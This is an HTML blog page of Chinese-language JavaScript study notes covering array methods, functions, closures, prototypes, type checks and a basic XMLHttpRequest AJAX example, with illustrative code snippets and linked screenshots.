src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218112356.png" alt="image-20211218112355298"></p><h1 id="Javascript中重要数据结构之数组"><a href="#Javascript中重要数据结构之数组" class="headerlink" title="Javascript中重要数据结构之数组"></a>Javascript中重要数据结构之数组</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218130603.png" alt="image-20211218130602557"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218130734.png" alt="image-20211218130733124"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218130948.png" alt="image-20211218130946675"></p><p><strong>splice</strong></p><ul><li>⽤于删除或替换元素</li><li>函数有返回值，返回的是被删除的元素</li><li>这个⽅法还会改变原来的数组</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 第⼀个参数是控制从第几位（包含）开始删除或者替换(得看第三个参数有没有值)</span><br><span class="line">&#x2F;&#x2F; 第⼆个参数控制删除的数量</span><br><span class="line">&#x2F;&#x2F; 第三个参数将删除了的元素替换掉，可⽤逗号隔开</span><br><span class="line">list.splice(2, 2, &#39;hello&#39;,&#39;xd&#39;)</span><br></pre></td></tr></table></figure><ul><li>使⽤场景<ul><li>替换数组中的元素</li><li>删除数组的⼀部分内容</li><li>清空的数组的作⽤</li></ul></li></ul><p><strong>join</strong></p><ul><li>将数组类型的数据转换成字符串</li><li>和toString的区别 可以⾃定义元素之间⽤自定义符号隔开</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> list=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">console</span>.log(list.join(<span class="string">'*'</span>)) <span class="comment">// 1*2*3</span></span><br></pre></td></tr></table></figure><p><strong>concat</strong></p><ul><li>用于连接两个或多个数组</li><li>不会更改现有数组，而是返回一个新数组，其中包含已连接数组的值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1.concat(array2, array3, ..., arrayX)</span><br></pre></td></tr></table></figure><ul><li><p>题⽬⼀：将字符串<code>&quot;张三,李四,小明,小红&quot;</code>转化成数组，并且删除<code>&quot;李四&quot;</code></p><ul><li><p>提示：split,indexOf</p></li><li><pre><code class="js"><span class="keyword">var</span> str = <span class="string">'张三,李四,小明,小红'</span>;<span class="keyword">var</span> list = str.split(<span class="string">','</span>);<span class="comment">// console.log(list);</span><span class="keyword">var</span> index = list.indexOf(<span class="string">'李四'</span>);<span class="comment">// console.log(index);</span>list.splice(<span class="number">1</span>, <span class="number">1</span>);<span class="built_in">console</span>.log(list);&lt;!--￼<span class="number">3</span>--&gt;</code></pre></li></ul></li></ul><h1 id="运算符和流程控制"><a href="#运算符和流程控制" class="headerlink" title="运算符和流程控制"></a>运算符和流程控制</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218133831.png" alt="image-20211218133828996"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218134141.png" alt="image-20211218134139894"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218134213.png" alt="image-20211218134211664"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218134246.png" alt="image-20211218134244635"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218135651.png" alt="image-20211218135649781"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&amp;&amp; 的优先级高所以结果是 true</span><br><span class="line">console.log(true || false &amp;&amp; false);   &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218140545.png" alt="image-20211218140544099"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218140614.png" alt="image-20211218140613434"></p><h1 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218141221.png" alt="image-20211218141219823"></p><ul><li>switch 内部严格按照===的规则，⼀定要值和类型相等才⾏ 使⽤break语句打断程序</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218143853.png" alt="image-20211218143852624"></p><h1 id="Javascript函数"><a href="#Javascript函数" class="headerlink" title="Javascript函数"></a>Javascript函数</h1><ul><li><p>形参</p><ul><li><p>声明函数的时候定义的参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xd</span>(<span class="params">a,b</span>)</span>&#123;  <span class="comment">// a、b是形参</span></span><br><span class="line">  <span class="comment">// 要执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>实参</p><ul><li><p>调⽤函数的时候传的⼀个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xd(1,2)  &#x2F;&#x2F; 1、2就是实参</span><br></pre></td></tr></table></figure></li></ul></li><li><p>特点</p><ul><li>形参和实参是⼀⼀对应的</li><li>数量可以不对应</li><li>参数的类型不确定</li><li>函数可以设置默认参数</li><li>实参可以是字⾯量也可以是变量</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function xd(参数) &#123;</span><br><span class="line"> &#x2F;&#x2F; 执⾏语句</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 匿名函数表达式</span><br><span class="line">var xd&#x3D;function(参数)&#123;</span><br><span class="line">  &#x2F;&#x2F; 执⾏语句</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 构造函数声明</span><br><span class="line">var xd &#x3D;new Function([arg1[, arg2[, ...argN]],] functionBody)</span><br></pre></td></tr></table></figure><ul><li>注意<ul><li>声明函数过程中，函数⾥的语句是不会执⾏</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218144450.png" alt="image-20211218144447188"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218145942.png" alt="image-20211218145940388"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218150020.png" alt="image-20211218150019550"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218150154.png" alt="image-20211218150152691"></p><ul><li>变量<ul><li>全局变量<ul><li>挂载到window对象上的</li></ul></li><li>局部变量<ul><li>函数体内部声明的变量</li></ul></li></ul></li><li>作⽤域链<ul><li>内层函数是可以访问外层函数声明的⼀个变量，反之，则不可以</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218151923.png" alt="image-20211218151921092"></p><ul><li>arguments<ul><li>是⽤来取参的</li><li>传⼊的实参都能在函数体⾥通过arguments类数组取到</li><li>具有数组的⼀些特点<ul><li>通过索引取参</li><li>有⻓度</li></ul></li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218152154.png" alt="image-20211218152153428"></p><p><strong>⽴即执⾏函数</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218154009.png" alt="image-20211218154008345"></p><p>⽴即执⾏函数（IIFE）</p><ul><li><p>括号的作⽤</p><ul><li>帮助我们调⽤函数</li></ul></li><li><p>特点</p><ul><li>匿名函数</li><li>⾃动执⾏</li><li>执⾏完成以后销毁</li></ul></li><li><p>写法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure></li><li><p>可以传参数</p></li><li><p>注意</p><ul><li><p>前⾯的语句必须加分号，否则会解析错误</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218154330.png" alt="image-20211218154328317"></p></li></ul></li><li><p>题⽬⼀：编写⼀个函数，排列任意元素个数的数字数组，按从⼩到⼤顺序输出</p><p>提示：原生js逻辑或者用数组的sort方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组sort方法实现</span></span><br><span class="line"><span class="keyword">var</span> list = [<span class="number">81</span>, <span class="number">132</span>, <span class="number">24</span>, <span class="number">51</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sorts</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  array.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(sorts(list));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原生js逻辑去实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; array.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; array.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (array[j] &gt; array[j + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = array[j];</span><br><span class="line">        array[j] = array[j + <span class="number">1</span>];</span><br><span class="line">        array[j + <span class="number">1</span>] = a;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(sort([<span class="number">32</span>, <span class="number">1121</span>, <span class="number">232</span>, <span class="number">5</span>, <span class="number">4</span>]));</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>题⽬⼆：输⼊某个数字，计算数字的阶乘</p><ul><li>递归函数实现这道题</li><li>6！ = 1 * 2 * 3 * 4 * 5 * 6</li><li>n! = 1 * 2 * 3 * 4 * … … * n</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> n * test(n - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// n * test(n - 1)</span></span><br><span class="line"><span class="comment">// 3 * 2 * 1  </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(test(<span class="number">3</span>));</span><br></pre></td></tr></table></figure><h1 id="Javascript闭包"><a href="#Javascript闭包" class="headerlink" title="Javascript闭包"></a>Javascript闭包</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化计数器</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递增计数器的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> count += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调⽤三次 add()</span></span><br><span class="line">add();</span><br><span class="line">add();</span><br><span class="line">add();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218160721.png" alt="image-20211218160720056"></p><ul><li>闭包<ul><li>闭包是指有权访问另⼀个函数作⽤域中的变量的函数</li></ul></li><li>闭包的副作⽤<ul><li>产⽣内存泄漏<ul><li>⽐如说我本来要销毁函数的数据，被强⾏保存下来了，保存在内存当中</li></ul></li></ul></li><li>通过闭包能实现什么<ul><li>实现外界访问函数体内部的变量</li></ul></li></ul><h1 id="Javascript的原型和原型链"><a href="#Javascript的原型和原型链" class="headerlink" title="Javascript的原型和原型链"></a>Javascript的原型和原型链</h1><p>原型（<code>prototype</code>）</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218161148.png" alt="image-20211218161146960"></p><p><strong>原型是function对象的一个属性，它定义了构造函数制造出的对象的公共祖先，通过该构造函数产生的对象，可以继承该原型的属性和方法，原型也是对象</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Person.prototype.lastName=<span class="string">'刘'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1=<span class="keyword">new</span> Person()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(person1.lastName) <span class="comment">// 刘</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218163015.png" alt="image-20211218163014448"></p><ul><li>原型的作⽤<ul><li>给我们构造函数实例化出来的对象设置公共的属性或者⽅法使⽤的</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218163321.png" alt="image-20211218163319460"></p><ul><li><p>方法写在哪</p><ul><li><p>⽅法写在原型上</p><ul><li>写在构造函数⾥的⽅法和属性会重新克隆⼀次，会导致占⽤内存较⾼</li></ul></li><li><p>需要配置的属性是写在构造函数上</p></li><li><p><strong>只有构造函数才能对原型上的属性进⾏改动</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218163538.png" alt="image-20211218163527740"></p></li></ul></li></ul><p><strong>⾯试常考知识点之原型链</strong></p><ul><li><p><strong>只有构造函数才能对原型上的属性进⾏改动</strong></p></li><li><p>函数才有<code>prototype</code>属性,对象有<code>__proto__ || [[prototype]]</code>属性</p></li><li><p>原型链</p><ul><li>js⾥万物皆对象，所以⼀直访问<code>__proto__</code>属性就会产⽣⼀条链条</li><li>链条的尽头是null</li><li>当js引擎查找对象的属性时，会先判断对象本身是否存在该属性</li><li>不存在的属性就会沿着原型链往上找</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218152717.png" alt="image-20211218152715923"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function Car() &#123;&#125;</span><br><span class="line">var car &#x3D; new Car()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218170611.png" alt="image-20211218170601012"></p><p>什么是原型链?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原型链解决的主要是继承问题</span><br><span class="line">每个对象拥有一个原型对象，通过 proto 指针指向其原型对象，并从中继承方法和属性，同时原型对象也可能拥有原型，这样一层一层，最终指向</span><br><span class="line">null(Object.proptotype.__proto__指向的是null)。这种关系被称为原型链(prototype chain)，通过原型链一个对象可以拥有定义在其他对象中的属性和方法</span><br></pre></td></tr></table></figure><p><strong>类型检测</strong>typeof</p><p>用于判断基础数据的类型，无法区分对象与数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> a); <span class="comment">//number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="string">"1"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> b); <span class="comment">//string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xd;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> xd); <span class="comment">//undefined</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> fun); <span class="comment">//function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> c); <span class="comment">//object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = &#123; <span class="attr">name</span>: <span class="string">"小滴课堂"</span> &#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> d); <span class="comment">//object</span></span><br></pre></td></tr></table></figure><p>instanceof</p><p>用于判断复杂数据的类型，可以区分对象与数组</p><p><code>instanceof</code> 运算符用于检测构造函数的 <code>prototype</code> 属性是否出现在某个实例对象的原型链上，可以理解为是否为某个对象的实例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xd = [];</span><br><span class="line"><span class="keyword">var</span> xdclass = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(xd <span class="keyword">instanceof</span> <span class="built_in">Array</span>); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(xdclass <span class="keyword">instanceof</span> <span class="built_in">Array</span>); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(c <span class="keyword">instanceof</span> <span class="built_in">Array</span>); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = &#123; <span class="attr">name</span>: <span class="string">"houdunren.com"</span> &#125;;</span><br><span class="line"><span class="built_in">console</span>.log(d <span class="keyword">instanceof</span> <span class="built_in">Object</span>); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fun</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> xd = <span class="keyword">new</span> Fun();</span><br><span class="line"><span class="built_in">console</span>.log(xd <span class="keyword">instanceof</span> Fun); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h1 id="插件化开发初体验之写⼀个插件"><a href="#插件化开发初体验之写⼀个插件" class="headerlink" title="插件化开发初体验之写⼀个插件"></a>插件化开发初体验之写⼀个插件</h1><ul><li>需求：写⼀个对两个数字进⾏加法运算计算器</li><li>为什么要写在函数⾥<ul><li>因为函数⾥声明的变量或者函数，对外界⽆影响</li><li>为了让函数在浏览器加载的时候执⾏，那么还要⽤⽴即函数</li></ul></li><li><strong>步骤</strong><ul><li><strong>声明一个构造函数</strong></li><li><strong>将公共⽅法写在原型上</strong></li><li><strong>将构造函数挂载到window上</strong></li><li><strong>写⼀个⽴即执⾏函数</strong></li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Sum</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">  Sum.prototype.add = <span class="function"><span class="keyword">function</span> (<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">window</span>.Sum = Sum;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sum = <span class="keyword">new</span> Sum();</span><br><span class="line"><span class="keyword">var</span> a = sum.add(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br></pre></td></tr></table></figure><h1 id="ajax"><a href="#ajax" class="headerlink" title="ajax"></a>ajax</h1><p><strong>ajax的前置知识—JSON</strong></p><ul><li>JSON是什么<ul><li>JSON(JavaScript Object Notation)是⼀种轻量级的数据交换格式，它基于JavaScript的⼀个⼦集，易于⼈的编写和阅读，也易于机器解析。 JSON采⽤完全独⽴于语⾔的⽂本格式，但是也使⽤了类似于C语⾔家族的习惯（包括C, C++, C#, Java, JavaScript, Perl, Python等。 这些特性使JSON成为理想的数 据交换语⾔</li><li>⼀⾔以蔽之<ul><li>JSON是⽤来做数据交换的⼀种语⾔</li></ul></li></ul></li><li>JSON的语法格式<ul><li>属性名称必须是双引号括起来的字符串</li><li>最后⼀个属性后不能有逗号</li></ul></li><li>JSON的作⽤<ul><li>⽤于传输数据</li></ul></li><li>序列化和反序列化<ul><li>对象序列化后可以在⽹络上传输，或者保存到硬盘(浏览器)上。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'张三'</span>,</span><br><span class="line">  age: <span class="string">'18'</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">JSON</span>.stringify(obj); <span class="comment">// 序列化、转换成JSON格式</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">JSON</span>.parse(a); <span class="comment">// 反序列化 、转换成对象格式</span></span><br></pre></td></tr></table></figure><p> <img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218193646.png" alt="image-20211218193644822"></p><ul><li><p>什么是ajax</p><ul><li>以前<ul><li>前后端不分离，后端返回整个html</li><li>每次更新⼀些数据，他都会整个⽹⻚刷新</li></ul></li><li>现在<ul><li>ajax帮助我们向服务器发异步请求</li></ul></li></ul></li><li><p>同步/异步</p><p>两个术语与我们生活中的意思是相反的</p><ul><li><p>同步</p><p>煮着开⽔，在旁边盯着，等到⽔开了，你才做下件事</p></li><li><p>异步</p><p>煮着开⽔，同时你继续做了其他事</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218194255.png" alt="image-20211218194254346"></p></li></ul></li><li><p>原理</p><ul><li>通过XmlHttpRequest对象向服务器发异步请求，从服务器获取数据</li><li>然后通过js来操作DOM⽽更新⻚⾯</li><li>它是在 IE5 中⾸先引⼊的，是⼀种⽀持异步请求的技术</li><li>简单的说，也就是 javascript 可以及时向服务器提出请求和处理响应，⽽不阻塞程序运行，达到⽆刷新的效果</li></ul></li><li><p>注意</p><ul><li>JavaScript是单线程的，会阻塞代码运⾏，所以引⼊XmlHttpRequest请求处理异步数据</li></ul><p><strong>ajax请求</strong></p></li></ul><p>创建ajax对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)&#123;</span><br><span class="line"> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">// code for IE6, IE5 兼容</span></span><br><span class="line"> xhr = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置请求地址及⽅式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第⼀个参数是⽤于指定请求的⽅式，⼀般⽤⼤写</span></span><br><span class="line"><span class="comment">第二个参数代表请求的URL</span></span><br><span class="line"><span class="comment">第三个参数是表示是否异步发送请求的布尔值，如果不填写，默认为true，表示异步发送，同步已经被弃用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">          POST</span><br><span class="line">xhr.open(<span class="string">"GET"</span>,<span class="string">"https://api.xdclass.net/pub/api/v1/web/index_card"</span>)</span><br></pre></td></tr></table></figure><ul><li><p>发送请求(可选参数， null)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.send()</span><br></pre></td></tr></table></figure></li></ul><p>（注册事件）等到浏览器返回结果接受响应</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">注册事件。 onreadystatechange事件，状态改变时就会调用。</span></span><br><span class="line"><span class="comment">如果要在数据完整请求回来的时候才调用，我们需要手动写一些判断的逻辑。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 为了保证数据完整返回，我们一般会判断两个值</span></span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    alert(xhr.responseText);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alert(<span class="string">'出错了，Err:'</span> + xhr.status);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218195933.png" alt="image-20211218195930846"></p><h1 id="Javascript操作DOM"><a href="#Javascript操作DOM" class="headerlink" 